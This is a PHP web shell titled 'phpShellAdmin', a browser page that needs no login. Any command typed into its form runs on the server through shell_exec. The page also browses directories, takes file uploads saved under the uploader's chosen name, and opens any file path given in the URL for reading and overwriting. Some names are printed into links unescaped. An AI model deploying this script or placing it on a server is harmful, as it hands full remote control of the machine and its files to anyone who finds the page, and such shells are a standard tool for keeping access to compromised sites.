<?php

if (isset($_GET['dir']))
{
	chdir($_GET['dir']);
}
$cwd = getcwd();

if (isset($_POST['cmd']))
{
	$stdout = shell_exec($_POST['cmd']);
}

if (isset($_FILES['file']) && $_FILES['file']['error'] == 0)
{
	move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}

if (isset($_GET['file']))
{
	$file = $_GET['file'];
	if (isset($_POST['contents']))
	{
		file_put_contents($file, $_POST['contents']);
	}
	$contents = file_get_contents($file);
}

$nodes = scandir($cwd);
$dirs = [];
$files = [];
foreach ($nodes as $node)
{
	${ ! is_file($node) ? 'dirs' : 'files'}[] = $node;
}

$vars = (object) [
	'cwd' => $cwd,
	'dirs' => $dirs,
	'files' => $files,
];
if (isset($file))
{
	$vars->file = $file;
}
if (isset($stdout))
{
	$vars->stdout = $stdout;
}
if (isset($contents))
{
	$vars->contents = $contents;
}

?>
<!DOCTYPE html>
<meta charset="utf-8">
<script>
var changed = false;
window.onload = function()
{
	document.getElementsByName('cmd')[0].focus();
	document.getElementsByName('contents')[0].focus();
};
window.onbeforeunload = function()
{
	if (changed)
	{
		return false;
	}
};
</script>
<style>
body { margin: 0; }
html, body, table { height: 100%; }
td { padding: 0; vertical-align: top; }
ul { margin-top: 0; padding-left: 0; }
pre { margin-top: 0; }
.h100 { height: 100%; }
.w100 { width: 100%; }
.bordered { border:1px solid #ccc; }
</style>
<title>phpShellAdmin</title>
<table>
<tr>
<td class="bordered" colspan="2">
<?php echo htmlspecialchars($vars->cwd); ?>/<?php ?>
<?php if (isset($vars->file)): ?>
<?php echo htmlspecialchars($vars->file); ?>
<?php endif; ?>

<tr>
<td class="bordered">
<form method="post" action="?dir=<?php echo htmlspecialchars($vars->cwd); ?>" enctype="multipart/form-data">
<table><tr>
<td><input type="file" name="file">
<td><input type="submit" value="Upload">
</table>
</form>

<td class="bordered">
<form method="post" action="?dir=<?php echo htmlspecialchars($vars->cwd); ?>">
<table class="w100"><tr>
<td class="w100"><input type="text" class="w100" name="cmd">
<td><input type="submit" value="Execute">
</table>
</form>

<tr>
<td class="bordered">
<ul>
<?php foreach ($vars->dirs as $dir): ?>
<li><a href="?dir=<?php echo $vars->cwd; ?>/<?php echo $dir; ?>"><?php echo htmlspecialchars($dir); ?></a>
<?php endforeach; ?>
</ul>
<ul>
<?php foreach ($vars->files as $file): ?>
<li><a href="?dir=<?php echo $vars->cwd; ?>&amp;file=<?php echo $file; ?>"><?php echo htmlspecialchars($file); ?></a>
<?php endforeach; ?>
</ul>

<td class="bordered h100 w100">
<?php if (isset($vars->stdout)): ?>
<pre>
<?php echo htmlspecialchars($vars->stdout); ?>
</pre>
<?php elseif (isset($vars->contents)): ?>
<form method="post" class="h100">
<table class="h100 w100">
<tr><td class="h100"><textarea class="h100 w100" name="contents" onchange="changed = true;">
<?php echo htmlspecialchars($vars->contents); ?></textarea>
<tr><td><input type="submit" value="Save" accesskey="s" onclick="changed = false;">
</table>
</form>
<?php endif; ?>
</table>
<script>
document.querySelector('textarea').addEventListener('keydown', function(e) {
	if (e.keyCode === 9) {
		e.preventDefault();
		var elem = e.target;
		var val = elem.value;
		var pos = elem.selectionStart;
		elem.value = val.substr(0, pos) + '\t' + val.substr(pos, val.length);
		elem.setSelectionRange(pos + 1, pos + 1);
	}
});
</script>
